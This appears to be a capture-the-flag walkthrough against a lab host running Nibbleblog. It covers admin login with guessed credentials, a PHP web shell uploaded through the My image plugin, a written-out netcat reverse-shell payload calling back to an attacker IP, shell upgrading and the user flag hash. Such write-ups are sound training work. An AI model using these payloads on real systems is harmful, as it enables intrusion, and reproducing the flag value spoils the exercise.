#### **1. Admin Portal Access**
- **URL**: `http://10.129.42.190/nibbleblog/admin.php`
- **Login Credentials**:
    - Username: `admin`
    - Password: `nibbles`
- Explored the available pages:
    - **Themes and Plugins** are of particular interest, with the **My image plugin** allowing file uploads.



#### **2. Exploiting File Upload Functionality**
- **Target Page**: `http://10.129.42.190/nibbleblog/admin.php?controller=plugins&action=config&plugin=my_image`
- Tested uploading a PHP snippet:
    
    ```php
    <?php system('id'); ?>
    ```
- **Result**:
    - Errors were displayed, but the file uploaded successfully.



#### **3. Locating Uploaded File**
- From enumeration, the upload path was identified:
    - `http://10.129.42.190/nibbleblog/content/private/plugins/my_image/`
- File confirmation:
    ```bash
    curl http://10.129.42.190/nibbleblog/content/private/plugins/my_image/image.php
    ```
- **Output**:
    ```plaintext
    uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
    ```
    - Remote code execution confirmed with the `nibbler` user.



#### **4. Creating a Reverse Shell**
- Modified the PHP file to include a reverse shell payload:
    ```php
    <?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 9443 >/tmp/f"); ?>
    ```
    - Replace `10.10.14.2` with the attacker's IP and `9443` with a chosen port.



#### **5. Setting Up the Listener**
- Started a Netcat listener:
    ```bash
    nc -lvnp 9443
    ```    



#### **6. Triggering the Reverse Shell**
- Triggered the reverse shell by visiting:
    - `http://10.129.42.190/nibbleblog/content/private/plugins/my_image/image.php`
- **Netcat Output**:
    ```plaintext
    connect to [10.10.14.2] from (UNKNOWN) [10.129.42.190] 40106
    /bin/sh: 0: can't access tty; job control turned off
    $ id
    uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
    ```
    


#### **7. Upgrading to an Interactive Shell**
- Tried upgrading the shell with Python:
    
    ```bash
    python -c 'import pty; pty.spawn("/bin/bash")'
    ```
- **Error**: `python` not found.
- Used Python 3 instead:
    ```bash
    python3 -c 'import pty; pty.spawn("/bin/bash")'
    ```
- **Improved Shell**:
    - Commands like `su` and text editors now functional.



#### **8. Enumerating the Home Directory**
- **Path**: `/home/nibbler`
- **Contents**:
    - `personal.zip`: A compressed file that may hold additional information.
    - `user.txt`: User flag.



### **Next Steps**
1. Extract and analyze the contents of `personal.zip`.
2. Continue enumerating the system for privilege escalation paths to root access.



### Questions
-  Gain a foothold on the target and submit the user.txt flag
	- 79c03865431abf47b90ef24b9695e148